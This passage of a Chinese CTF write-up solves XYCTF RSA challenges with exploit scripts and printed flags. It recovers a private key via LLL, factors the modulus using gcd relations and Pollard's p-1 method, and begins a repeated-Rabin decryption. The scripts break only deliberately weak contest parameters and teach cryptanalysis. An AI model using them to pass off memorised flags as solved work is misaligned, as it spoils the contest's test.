transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(600,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"/></g><g data-mml-node="mi" transform="translate(878,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(1478,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g><g data-mml-node="mi" transform="translate(1907,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(2252,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"/></g><g data-mml-node="mi" transform="translate(2613,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/></g><g data-mml-node="mo" transform="translate(3082,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mo" transform="translate(3471,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3860,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"/></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(4360,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"/></g></g><g data-mml-node="mn" transform="translate(4860,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g></g></g></g></svg></mjx-container></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#sagemath</span><br>e=172005065945326769176157335849432320425605083524943730546805772515111751580759726759492349719668775270727323745284785341119685198468883978645793770975366048506237371435027612758232099414404389043740306443065413069994232238075194102578269859784981454218948784071599231415554297361219709787507633404217550013282713899284609273532223781487419770338416653260109238572639243087280632577902857385265070736208291583497988891353312351322545840742380550393294960815728021248513046077985900158814037534487146730483099151396746751774427787635287611736111679074330407715700153025952858666841328055071403960165321273972935204988906850585454805923440635864200149694398767776539993952528995717480620593326867245714074205285828967234591508039849777840636255379730281105670496110061909219669860172557450779495125345533232776767292561378244884362014224844319802810586344516400297830227894063759083198761120293919537342405893653545157892446163<br>n=99075185389443078008327214328328747792385153883836599753096971412377366865826254033534293886034828804219037466246175526347014045811852531994537520303063113985486063022444972761276531422538694915030159420989401280012025249129111871649831185047820236417385693285461420040134313833571949090757635806658958193793<br>n=n^3<br>from Crypto.Util.number import *<br>import random<br>from gmpy2 import *<br>D = 2^(n.nbits()//2)<br>m = matrix(ZZ, [<br>  [D, n+1],<br>  [0, -e]<br>])<br>L = m.LLL()<br>w = L[0]<br>v = m.solve_left(w)<br>k = abs(v[0])<br>d = abs(v[1])<br>print(k)<br>print(d)<br>k=1494016303704162064457264904035459059241052443477469129020991127731711502975536480528822831565100775167693515363479900721259984367515846296462994230670260<br>d=8447122254265361577759220083550460887840558233627984117576685838469227480934556534673167325385487344741530262745308367064419215281251764917289925433582347<br><br></code></pre></td></tr></table></figure><p>根据k,d即可求出p,q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> libnum<br><br>e=<span class="hljs-number">172005065945326769176157335849432320425605083524943730546805772515111751580759726759492349719668775270727323745284785341119685198468883978645793770975366048506237371435027612758232099414404389043740306443065413069994232238075194102578269859784981454218948784071599231415554297361219709787507633404217550013282713899284609273532223781487419770338416653260109238572639243087280632577902857385265070736208291583497988891353312351322545840742380550393294960815728021248513046077985900158814037534487146730483099151396746751774427787635287611736111679074330407715700153025952858666841328055071403960165321273972935204988906850585454805923440635864200149694398767776539993952528995717480620593326867245714074205285828967234591508039849777840636255379730281105670496110061909219669860172557450779495125345533232776767292561378244884362014224844319802810586344516400297830227894063759083198761120293919537342405893653545157892446163</span><br>n=<span class="hljs-number">99075185389443078008327214328328747792385153883836599753096971412377366865826254033534293886034828804219037466246175526347014045811852531994537520303063113985486063022444972761276531422538694915030159420989401280012025249129111871649831185047820236417385693285461420040134313833571949090757635806658958193793</span><br>k=<span class="hljs-number">1494016303704162064457264904035459059241052443477469129020991127731711502975536480528822831565100775167693515363479900721259984367515846296462994230670260</span><br>d=<span class="hljs-number">8447122254265361577759220083550460887840558233627984117576685838469227480934556534673167325385487344741530262745308367064419215281251764917289925433582347</span><br><br>k = e * d - <span class="hljs-number">1</span><br><br>r = k<br>t = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = r // <span class="hljs-number">2</span><br>    t += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> r % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br><br>success = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">101</span>):<br>    g = random.randint(<span class="hljs-number">0</span>, n)<br>    y = <span class="hljs-built_in">pow</span>(g, r, n)<br>    <span class="hljs-keyword">if</span> y == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> y == n - <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, t):<br>        x = <span class="hljs-built_in">pow</span>(y, <span class="hljs-number">2</span>, n)<br>        <span class="hljs-keyword">if</span> x == <span class="hljs-number">1</span>:<br>            success = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> x == n - <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            y = x<br><br>    <span class="hljs-keyword">if</span> success:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><br><span class="hljs-keyword">if</span> success:<br>    p = libnum.gcd(y - <span class="hljs-number">1</span>, n)<br>    q = n // p<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'p = '</span> + <span class="hljs-string">'%s'</span> % p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'q = '</span> + <span class="hljs-string">'%s'</span> % q)<br>    flag = <span class="hljs-string">"XYCTF{"</span> + hashlib.md5(<span class="hljs-built_in">str</span>(p + q).encode()).hexdigest() + <span class="hljs-string">"}"</span><br>    <span class="hljs-built_in">print</span>(flag)<br>    <span class="hljs-built_in">print</span>(n==p*q)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'Cannot compute P and Q'</span>)<br><span class="hljs-string">'''   </span><br><span class="hljs-string">p = 9212046353930376594996890089494718736894378991991381248242532319628627449681664076081705664941905594411935750003102856235503684466394327681725704255564467</span><br><span class="hljs-string">q = 10754959493573546439510276829300246769373124436128170955050379041986504869221750743052397622171703140881050431144683659643071578143360949942206693325622779</span><br><span class="hljs-string">XYCTF{a83211a70e18145a59671c08ddc67ba4}</span><br><span class="hljs-string">True</span><br><span class="hljs-string">'''</span><br></code></pre></td></tr></table></figure><p>这里用wiener也可以，只不过需要在多组k,d解出的p,q验证。应为d为512位，n^3有512 <em> 2 </em> 3位，delta=0.1666···，满足条件</p><h3 id="babyRSAMAX"><a href="#babyRSAMAX" class="headerlink" title="babyRSAMAX"></a>babyRSAMAX</h3><p>题目：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs 1c">from Crypto.Util.number import *<br>from gmpy2 import *<br>from random import choice<br><br>flag = b'XYCTF{******}'<br>e = '?'<br>def getBabyPrime(nbits):<br>    while True:<br>        p = <span class="hljs-number">1</span><br>        while p.bit_length() &lt;= nbits:<br>            p *= choice(sieve_base)<br>        <br>        if isPrime(p+<span class="hljs-number">1</span>):<br>            return p+<span class="hljs-number">1</span><br><br>p = getBabyPrime(<span class="hljs-number">512</span>)<br>q = getBabyPrime(<span class="hljs-number">512</span>)<br>n = p*q<br>gift1 = (<span class="hljs-built_in">pow</span>(p,e,n)-<span class="hljs-built_in">pow</span>(q,e,n)) % n<br>gift2 = <span class="hljs-built_in">pow</span>(p+q,e,n)<br><br>t = <span class="hljs-number">65537</span><br>x = bytes_to_long(e)<br>y = <span class="hljs-built_in">pow</span>(x, t, n)<br><br>m = bytes_to_long(flag)<br>c = powmod(m, e, n)<br><br>print(f'n = {n}')<br>print(f'gift1 = {gift1}')<br>print(f'gift2 = {gift2}')<br>print(f'c = {c}')<br>print(f'y = {y}')<br><br>'''<br>n = <span class="hljs-number">39332423872740</span><span class="hljs-number">21078324606903</span><span class="hljs-number">08559462441049</span><span class="hljs-number">82381157166843</span><span class="hljs-number">97759978023391</span><span class="hljs-number">11831585609013</span><span class="hljs-number">77359925435092</span><span class="hljs-number">32665330396426</span><span class="hljs-number">15501586585515</span><span class="hljs-number">18626014048783</span><span class="hljs-number">43524547153695</span><span class="hljs-number">98448740365169</span><span class="hljs-number">31542444719549</span><span class="hljs-number">99797148264490</span><span class="hljs-number">55234594077753</span><span class="hljs-number">92702211086149</span><span class="hljs-number">27947378479620</span><span class="hljs-number">20202819097067</span><span class="hljs-number">23380472571862</span><span class="hljs-number">79200368742379</span><span class="hljs-number">15765300857477</span><span class="hljs-number">16706475220532</span>321<br>gift1 = <span class="hljs-number">45494024447463</span><span class="hljs-number">38327349007235</span><span class="hljs-number">81818779395028</span><span class="hljs-number">51050917261675</span><span class="hljs-number">73552412678416</span><span class="hljs-number">75969466016695</span><span class="hljs-number">67827556314472</span><span class="hljs-number">71662108564084</span><span class="hljs-number">38209856299995</span><span class="hljs-number">02287083009022</span><span class="hljs-number">01571583419116</span><span class="hljs-number">29993226447838</span><span class="hljs-number">11970344023384</span><span class="hljs-number">81872937576172</span><span class="hljs-number">19720251977078</span><span class="hljs-number">24583436060605</span><span class="hljs-number">44694608852844</span><span class="hljs-number">22840045723210</span><span class="hljs-number">09042170629140</span><span class="hljs-number">47342663534138</span><span class="hljs-number">66849032840002</span><span class="hljs-number">26518165973673</span>10<br>gift2 = <span class="hljs-number">11106121599895</span><span class="hljs-number">97099207364480</span><span class="hljs-number">50860427855012</span><span class="hljs-number">02681537667206</span><span class="hljs-number">76012440535805</span><span class="hljs-number">66359594802604</span><span class="hljs-number">25199298638218</span><span class="hljs-number">78910225832479</span><span class="hljs-number">97994146019970</span><span class="hljs-number">44524750911971</span><span class="hljs-number">94113107604919</span><span class="hljs-number">83876636264003</span><span class="hljs-number">94287075640232</span><span class="hljs-number">86340921467998</span><span class="hljs-number">25005835867245</span><span class="hljs-number">56342013525304</span><span class="hljs-number">82238983344600</span><span class="hljs-number">67523975023732</span><span class="hljs-number">15323079113687</span><span class="hljs-number">03243022591271</span><span class="hljs-number">59852763634051</span><span class="hljs-number">23881196916101</span><span class="hljs-number">1462</span><br>c = <span class="hljs-number">16938927825234</span><span class="hljs-number">40726702601756</span><span class="hljs-number">10454902656984</span><span class="hljs-number">91840814929432</span><span class="hljs-number">15283974503594</span><span class="hljs-number">61187437145666</span><span class="hljs-number">23315033802681</span><span class="hljs-number">00901769552637</span><span class="hljs-number">43973703439843</span><span class="hljs-number">60997903165842</span><span class="hljs-number">59141420319718</span><span class="hljs-number">49465884703557</span><span class="hljs-number">28984912522040</span><span class="hljs-number">74469197481963</span><span class="hljs-number">01181639762592</span><span class="hljs-number">46941579063687</span><span class="hljs-number">85799419330955</span><span class="hljs-number">41298162689316</span><span class="hljs-number">72391946592680</span><span class="hljs-number">57868127069358</span><span class="hljs-number">99110214657524</span><span class="hljs-number">54315629283033</span>043<br>y = <span class="hljs-number">18136500012709</span><span class="hljs-number">67709841306491</span><span class="hljs-number">29771690896942</span><span class="hljs-number">52488885109851</span><span class="hljs-number">09381881270362</span><span class="hljs-number">75503138556492</span><span class="hljs-number">78693131125405</span><span class="hljs-number">34780853966341</span><span class="hljs-number">04452685670558</span><span class="hljs-number">90202950484733</span><span class="hljs-number">05762088786992</span><span class="hljs-number">44635006002488</span><span class="hljs-number">11177410412603</span><span class="hljs-number">91405962817182</span><span class="hljs-number">67442171523919</span><span class="hljs-number">72112746684509</span><span class="hljs-number">47666394594121</span><span class="hljs-number">76433379413830</span><span class="hljs-number">84421241147448</span><span class="hljs-number">92164155894256</span><span class="hljs-number">32696160513747</span><span class="hljs-number">92860829645202</span>17<br><br>'''<br></code></pre></td></tr></table></figure><p>存在关系：</p><script type="math/tex; mode=display">gift1 = p^e -q^e \enspace mod\enspace n</script><script type="math/tex; mode=display">gift2 = (p+q)^e =p^e+q^e \enspace mod \enspace n</script><script type="math/tex; mode=display">y=e^{65537} \enspace mod \enspace n</script><script type="math/tex; mode=display">c=m^e \enspace mod \enspace n</script><p>分解p，q</p><script type="math/tex; mode=display">gift1+gift2=2*p^e \enspace mod \enspace n</script><script type="math/tex; mode=display">gift2-gift1=2*q^e \enspace mod \enspace n</script><script type="math/tex; mode=display">p=gcd(gift1+gift2,n)</script><script type="math/tex; mode=display">q=gcd(gift2-gift1,n)</script><p>方法2：可能是非预期，因为p,q的生成是</p><script type="math/tex; mode=display">p_1*p_2**p_n+1</script><p>可以用p-1光滑攻击</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs 1c">n = <span class="hljs-number">39332423872740210783246069030855946244104982381157166843977599780233911183158560901377359925435092326653303964261550158658551518626014048783435245471536959844874036516931542444719549997971482644905523459407775392702211086149279473784796202020281909706723380472571862792003687423791576530085747716706475220532321</span><br><br><span class="hljs-meta"># decode: 利用 p-1 光滑攻击分解出 p,q</span><br>from gmpy2 import *<br>a = <span class="hljs-number">2</span><br>N = n<br>n = <span class="hljs-number">2</span><br>while True:<br>    a = powmod(a, n, N)<br>    res = gcd(a-<span class="hljs-number">1</span>, N)<br>    if res != <span class="hljs-number">1</span> and res != N:<br>        q = N <span class="hljs-comment">// res</span><br>        print(res*q==N)<br>        print('p=',res)<br>        print('q=',q)<br>        break<br>    n += <span class="hljs-number">1</span><br>'''<br>True<br>p= <span class="hljs-number">23643840047752</span><span class="hljs-number">15979229504451</span><span class="hljs-number">53796265199072</span><span class="hljs-number">40457718319095</span><span class="hljs-number">31148051705228</span><span class="hljs-number">75904551780358</span><span class="hljs-number">33876944055881</span><span class="hljs-number">63511052537949</span><span class="hljs-number">64040981919231</span><span class="hljs-number">48409809767108</span><span class="hljs-number">48953022874254</span>79<br>q= <span class="hljs-number">16635378937305</span><span class="hljs-number">73521952685751</span><span class="hljs-number">68397750362643</span><span class="hljs-number">82220125350894</span><span class="hljs-number">10528359454206</span><span class="hljs-number">24983216456266</span><span class="hljs-number">47817657965149</span><span class="hljs-number">00806969738496</span><span class="hljs-number">07356408696043</span><span class="hljs-number">71849249999306</span><span class="hljs-number">28634154245781</span>99<br>'''<br></code></pre></td></tr></table></figure><p>得到p,q后，就可以求出e</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">y = 1813650001270967709841306491297716908969425248888510985109381881270362755031385564927869313112540534780853966341044526856705589020295048473305762088786992446350060024881117741041260391405962817182674421715239197211274668450947666394594121764333794138308442124114744892164155894256326961605137479286082964520217<br>p= 236438400477521597922950445153796265199072404577183190953114805170522875904551780358338769440558816351105253794964040981919231484098097671084895302287425479<br>q= 166353789373057352195268575168397750362643822201253508941052835945420624983216456266478176579651490080696973849607356408696043718492499993062863415424578199<br><span class="hljs-built_in">print</span>(<span class="hljs-attribute">n</span>==p*q)<br><span class="hljs-attribute">d</span>=inverse(65537,(p-1)*(q-1))<br><span class="hljs-built_in">print</span>(long_to_bytes(pow(y,d,n)))<br><span class="hljs-comment">#b'XYCTF{e==4096}'</span><br></code></pre></td></tr></table></figure><p>很明显e=<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewbox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"/></g></g></g></g></g></svg></mjx-container>,采用多轮rabin攻击</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs vim">from Crypto.Util.<span class="hljs-keyword">number</span> import *<br><span class="hljs-keyword">e</span>=<span class="hljs-number">4096</span><br><span class="hljs-keyword">c</span> = <span class="hljs-number">16938927825234407267026017561045490265698491840814929432152839745035946118743714566623315033802681009017695526374397370343984360997903165842591414203197184946588470355728984912522040744691974819630118163976259246941579063687857994193309554129816268931672391946592680578681270693589911021465752454315629283033043</span><br><span class="hljs-keyword">p</span>= <span class="hljs-number">236438400477521597922950445153796265199072404577183190953114805170522875904551780358338769440558816351105253794964040981919231484098097671084895302287425479</span><br>q= <span class="hljs-number">166353789373057352195268575168397750362643822201253508941052835945420624983216456266478176579651490080696973849607356408696043718492499993062863415424578199</span><br><br>def repeat_rabin(<span class="hljs-keyword">x</span>,<span class="hljs-keyword">e</span>,<span class="hljs-keyword">p</span>,q):<br>    n = <span class="hljs-keyword">p</span> * q<br>    x0=gmpy2.<span class="hljs-built_in">invert</span>(<span class="hljs-keyword">p</span>,q)<br>    x1=gmpy2.<span class="hljs-built_in">invert</span>(q,<span class="hljs-keyword">p</span>)<br>    <span class="hljs-keyword">cs</span> = [<span class="hljs-keyword">c</span>]<br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-keyword">x</span>):<br>        <span class="hljs-keyword">ps</span> = []<br>        <span class="hljs-keyword">for</span> c2 in <span class="hljs-keyword">cs</span>:<br>            r = <span class="hljs-built_in">pow</span>(c2, (<span class="hljs-keyword">p</span> + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, <span class="hljs-keyword">p</span>)<br>            s = <span class="hljs-built_in">pow</span>(c2, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br>            <span class="hljs-keyword">x</span> = (r * x1 * q + s * x0 * <span class="hljs-keyword">p</span>) % n<br>            <span class="hljs-keyword">y</span> = (r * x1 * q - s * x0 * <span class="hljs-keyword">p</span>) % n<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">x</span> not in <span class="hljs-keyword">ps</span>:<br>                <span class="hljs-keyword">ps</span>.<span class="hljs-keyword">append</span>(<span 